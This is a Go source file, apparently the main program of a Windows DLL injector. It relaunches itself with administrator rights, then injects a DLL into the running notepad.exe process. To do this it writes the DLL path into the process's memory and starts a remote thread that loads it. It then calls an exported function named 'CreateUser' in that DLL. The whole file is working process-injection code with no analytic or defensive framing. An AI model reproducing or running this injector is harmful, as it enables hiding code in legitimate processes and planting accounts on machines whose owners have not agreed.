//go:build windows
// +build windows

package main

import (
	"Injector/utils"
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
)

// https://stackoverflow.com/questions/31558066/how-to-ask-for-administer-privileges-on-windows-with-go
func runMeElevated() {
	verb := "runas"
	exe, _ := os.Executable()
	cwd, _ := os.Getwd()
	args := strings.Join(os.Args[1:], " ")

	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	var showCmd int32 = 1 //SW_NORMAL

	err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
	if err != nil {
		fmt.Println(err)
	}
}

// https://stackoverflow.com/questions/31558066/how-to-ask-for-administer-privileges-on-windows-with-go
func amAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func main() {
	if !amAdmin() {
		runMeElevated()
	}
	//Get procID of target Process
	procID, _ := utils.GetProc("notepad.exe")

	// get Full DLLPath
	dllPath, _ := syscall.FullPath("..\\dll\\mydll.dll")
	fmt.Print(dllPath)
	//utils.InjectDLL(dllPath, procID)

	var inj utils.Inject
	inj.RemoteFuncName = "CreateUser"
	inj.DllName = "mydll.dll"
	inj.DllPath = dllPath
	inj.DLLSize = uint32(len(dllPath))
	inj.Pid = procID

	err := utils.OpenProcessHandle(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.VirtualAllocEx(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.WriteProcessMemory(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.GetLoadLibAddress(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.CreateRemoteThread(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.WaitForSingleObject(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.CallRemoteFunction(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.WaitForSingleObject(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = utils.VirtualFreeEx(&inj)
	if err != nil {
		log.Fatal(err)
	}

}
